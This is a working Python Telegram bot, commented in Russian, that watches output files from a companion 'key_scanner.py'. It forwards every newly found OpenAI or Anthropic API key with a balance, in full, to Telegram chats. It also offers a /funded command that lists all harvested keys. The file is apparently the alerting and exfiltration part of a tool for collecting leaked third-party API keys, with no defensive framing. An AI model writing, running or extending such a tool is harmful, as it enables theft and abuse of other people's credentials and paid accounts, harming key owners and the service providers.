#!/usr/bin/env python3
"""
Telegram-бот для уведомлений сканера API-ключей.
Работает рядом с key_scanner.py — следит за файлами и отправляет алерты.

Возможности:
  - Мгновенное уведомление при появлении funded ключа
  - Периодический отчёт о статусе
  - Команды: /status, /keys, /funded, /help
  - Отслеживание файлов в реальном времени

Запуск:
  python telegram_bot.py

Требуется TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID в .env
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import time
from datetime import datetime, timezone

import aiohttp

# ── конфигурация ────────────────────────────────────────────────────────────

def _load_dotenv(path: str = ".env") -> None:
    if not os.path.exists(path):
        return
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            if line.strip() and not line.startswith("#") and "=" in line:
                key, val = line.strip().split("=", 1)
                os.environ.setdefault(key.strip(), val.strip().strip('"').strip("'"))

_load_dotenv()

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
# Поддержка нескольких chat_id через запятую: TELEGRAM_CHAT_ID=123,456,789
CHAT_IDS: list[str] = [
    c.strip() for c in (os.getenv("TELEGRAM_CHAT_ID") or "").split(",") if c.strip()
]

FUNDED_FILES = {
    "OpenAI": "openai_keys.txt",
    "Anthropic": "anthropic_keys.txt",
}
EMPTY_FILE = "empty_keys.txt"

# Как часто проверять файлы (секунды)
WATCH_INTERVAL = 5
# Как часто отправлять статус (секунды), 0 = отключено
STATUS_INTERVAL = int(os.getenv("TG_STATUS_INTERVAL", "3600"))
# Интервал опроса Telegram (секунды)
POLL_INTERVAL = 2

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("tg-bot")

# ── вспомогательные функции ─────────────────────────────────────────────────

def _read_keys(path: str) -> list[str]:
    """Читает ключи из файла, по одному на строку."""
    if not os.path.exists(path):
        return []
    with open(path, "r", encoding="utf-8") as f:
        keys = []
        for line in f:
            stripped = line.strip()
            if not stripped:
                continue
            parts = stripped.split(" ", 1)
            if len(parts) == 2 and parts[0].isdigit():
                keys.append(parts[1])
            else:
                keys.append(stripped)
        return keys




def _file_mtime(path: str) -> float:
    try:
        return os.path.getmtime(path)
    except OSError:
        return 0.0


# ── Telegram API ────────────────────────────────────────────────────────────

class TelegramBot:
    def __init__(self, token: str, chat_ids: list[str]):
        self.token = token
        self.chat_ids = chat_ids
        self.base_url = f"https://api.telegram.org/bot{token}"
        self._session: aiohttp.ClientSession | None = None
        self._offset = 0

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession()
        return self._session

    async def set_commands(self) -> None:
        """Регистрирует команды бота — появляется кнопка-меню в Telegram."""
        commands = [
            {"command": "status", "description": "📊 Статус и счётчики"},
            {"command": "funded", "description": "💰 Ключи с балансом"},
            {"command": "help", "description": "❓ Помощь"},
        ]
        try:
            session = await self._get_session()
            async with session.post(
                f"{self.base_url}/setMyCommands",
                json={"commands": commands},
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                data = await resp.json()
                if not data.get("ok"):
                    logger.warning("setMyCommands ошибка: %s", data)
        except Exception as exc:
            logger.warning("setMyCommands ошибка: %s", exc)

    async def send(self, text: str, parse_mode: str = "Markdown", chat_id: str | None = None) -> bool:
        """Отправляет сообщение. Если chat_id не указан — отправляет всем."""
        targets = [chat_id] if chat_id else self.chat_ids
        ok = True
        for cid in targets:
            try:
                session = await self._get_session()
                async with session.post(
                    f"{self.base_url}/sendMessage",
                    json={
                        "chat_id": cid,
                        "text": text,
                        "parse_mode": parse_mode,
                        "disable_web_page_preview": True,
                    },
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    data = await resp.json()
                    if not data.get("ok"):
                        logger.warning("Ошибка отправки в %s: %s", cid, data)
                        ok = False
            except Exception as exc:
                logger.warning("Ошибка отправки в %s: %s", cid, exc)
                ok = False
        return ok

    async def get_updates(self) -> list[dict]:
        """Получает новые сообщения (команды) от пользователя."""
        try:
            session = await self._get_session()
            async with session.get(
                f"{self.base_url}/getUpdates",
                params={
                    "offset": str(self._offset),
                    "timeout": "5",
                    "allowed_updates": '["message"]',
                },
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                data = await resp.json()
                updates = data.get("result", [])
                if updates:
                    self._offset = updates[-1]["update_id"] + 1
                return updates
        except Exception:
            return []

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


# ── логика бота ─────────────────────────────────────────────────────────────

class ScannerBot:
    def __init__(self):
        self.bot = TelegramBot(BOT_TOKEN, CHAT_IDS)
        self._known_funded: dict[str, set[str]] = {}
        self._known_empty: set[str] = set()
        self._file_mtimes: dict[str, float] = {}
        self._start_time = time.time()
        self._alerts_sent = 0

    def _load_initial_state(self):
        """Загружает текущие ключи, чтобы уведомлять только о НОВЫХ."""
        for k_type, path in FUNDED_FILES.items():
            self._known_funded[k_type] = set(_read_keys(path))
            self._file_mtimes[path] = _file_mtime(path)
        self._known_empty = set(_read_keys(EMPTY_FILE))
        self._file_mtimes[EMPTY_FILE] = _file_mtime(EMPTY_FILE)

    def _build_status(self) -> str:
        """Формирует сообщение со статусом."""
        uptime = int(time.time() - self._start_time)
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)

        lines = ["📊 *Статус сканера*\n"]

        total_funded = 0
        for k_type, path in FUNDED_FILES.items():
            keys = _read_keys(path)
            count = len(keys)
            total_funded += count
            if count > 0:
                lines.append(f"💰 *{k_type}*: {count} ключей с балансом")

        if total_funded == 0:
            lines.append("💰 Ключей с балансом пока нет")

        empty_keys = _read_keys(EMPTY_FILE)
        lines.append(f"📭 *Пустых*: {len(empty_keys)} ключей")
        lines.append(f"📈 *Всего*: {total_funded + len(empty_keys)} ключей")
        lines.append(f"\n⏱ Аптайм бота: {hours}ч {minutes}м {seconds}с")
        lines.append(f"🔔 Уведомлений отправлено: {self._alerts_sent}")

        scanner_running = self._is_scanner_running()
        if scanner_running:
            lines.append("✅ Сканер: *работает*")
        else:
            lines.append("❌ Сканер: *не запущен*")

        return "\n".join(lines)

    def _build_funded_list(self) -> str:
        """Формирует список всех funded ключей."""
        lines = ["🔑 *Ключи с балансом*\n"]
        total = 0
        for k_type, path in FUNDED_FILES.items():
            keys = _read_keys(path)
            if keys:
                lines.append(f"\n*{k_type}* ({len(keys)}):")
                for i, key in enumerate(keys, 1):
                    lines.append(f"  {i}. `{key}`")
                total += len(keys)
        if total == 0:
            lines.append("Ключей с балансом пока нет.")
        return "\n".join(lines)


    @staticmethod
    def _is_scanner_running() -> bool:
        """Проверяет, запущен ли key_scanner.py."""
        try:
            import subprocess
            result = subprocess.run(
                ["pgrep", "-f", "key_scanner.py"],
                capture_output=True, text=True, timeout=5,
            )
            return result.returncode == 0
        except Exception:
            return False

    async def _check_file_changes(self):
        """Проверяет изменения файлов и отправляет алерты о новых ключах."""
        for k_type, path in FUNDED_FILES.items():
            mtime = _file_mtime(path)
            old_mtime = self._file_mtimes.get(path, 0)
            if mtime > old_mtime:
                logger.info("Файл изменён: %s", path)
                self._file_mtimes[path] = mtime
                current_keys = set(_read_keys(path))
                new_keys = current_keys - self._known_funded.get(k_type, set())
                if new_keys:
                    logger.info("Новых funded ключей: %d", len(new_keys))
                    self._known_funded[k_type] = current_keys
                    for key in new_keys:
                        self._alerts_sent += 1
                        msg = (
                            f"🔑💰 *НАЙДЕН КЛЮЧ С БАЛАНСОМ!*\n\n"
                            f"*Тип:* {k_type}\n"
                            f"*Ключ:* `{key}`\n"
                            f"*Полный:* `{key}`\n"
                            f"*Время:* {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}\n"
                            f"*Файл:* {path}"
                        )
                        ok = await self.bot.send(msg)
                        if not ok:
                            await self.bot.send(
                                f"НАЙДЕН КЛЮЧ С БАЛАНСОМ!\n"
                                f"Тип: {k_type}\nКлюч: {key}\n"
                                f"Полный: {key}\nФайл: {path}",
                                parse_mode="",
                            )
                        logger.info("Алерт отправлен: %s %s", k_type, key)

        # Обновляем счётчик пустых без уведомлений
        mtime = _file_mtime(EMPTY_FILE)
        old_mtime = self._file_mtimes.get(EMPTY_FILE, 0)
        if mtime > old_mtime:
            self._file_mtimes[EMPTY_FILE] = mtime
            self._known_empty = set(_read_keys(EMPTY_FILE))

    async def _handle_command(self, text: str, chat_id: str):
        """Обрабатывает команду от пользователя. Отвечает в тот же чат."""
        cmd = text.strip().lower().split()[0] if text.strip() else ""

        if cmd == "/status" or cmd == "/start":
            await self.bot.send(self._build_status(), chat_id=chat_id)
        elif cmd == "/funded":
            await self.bot.send(self._build_funded_list(), chat_id=chat_id)
        elif cmd == "/help":
            help_text = (
                "🤖 *Команды бота*\n\n"
                "/status — Статус сканера и счётчики\n"
                "/funded — Список ключей с балансом\n"
                "/help — Эта справка\n\n"
                "_Уведомления о новых ключах с балансом приходят автоматически._"
            )
            await self.bot.send(help_text, chat_id=chat_id)
        elif cmd.startswith("/"):
            await self.bot.send(f"Неизвестная команда: {cmd}\nНапишите /help", chat_id=chat_id)

    async def _poll_commands(self):
        """Опрашивает Telegram на наличие новых команд."""
        while True:
            try:
                updates = await self.bot.get_updates()
                for update in updates:
                    msg = update.get("message", {})
                    chat_id = str(msg.get("chat", {}).get("id", ""))
                    text = msg.get("text", "")
                    if chat_id in CHAT_IDS and text:
                        await self._handle_command(text, chat_id)
            except Exception as exc:
                logger.warning("Ошибка опроса: %s", exc)
            await asyncio.sleep(POLL_INTERVAL)

    async def _watch_files(self):
        """Следит за изменениями файлов ключей."""
        while True:
            try:
                await self._check_file_changes()
            except Exception as exc:
                logger.warning("Ошибка мониторинга: %s", exc)
            await asyncio.sleep(WATCH_INTERVAL)

    async def _periodic_status(self):
        """Отправляет периодический отчёт о статусе."""
        if STATUS_INTERVAL <= 0:
            return
        while True:
            await asyncio.sleep(STATUS_INTERVAL)
            try:
                await self.bot.send(self._build_status())
            except Exception as exc:
                logger.warning("Ошибка периодического статуса: %s", exc)

    async def run(self):
        """Точка входа."""
        if not BOT_TOKEN or not CHAT_IDS:
            print("ОШИБКА: Укажите TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID в .env")
            return

        logger.info("Бот запускается...")
        self._load_initial_state()

        # Регистрируем меню команд
        await self.bot.set_commands()

        # Стартовое сообщение
        funded_total = sum(len(v) for v in self._known_funded.values())
        empty_total = len(self._known_empty)
        startup = (
            f"🚀 *Бот сканера запущен*\n\n"
            f"Слежу за файлами ключей.\n"
            f"💰 С балансом: {funded_total} | 📭 Пустых: {empty_total}\n"
            f"Сканер: {'✅ работает' if self._is_scanner_running() else '❌ не запущен'}\n\n"
            f"Напишите /help для списка команд."
        )
        await self.bot.send(startup)
        logger.info("Стартовое сообщение отправлено. Слежу за файлами...")

        try:
            await asyncio.gather(
                self._poll_commands(),
                self._watch_files(),
                self._periodic_status(),
            )
        finally:
            await self.bot.close()


if __name__ == "__main__":
    try:
        asyncio.run(ScannerBot().run())
    except KeyboardInterrupt:
        print("\nБот остановлен.")
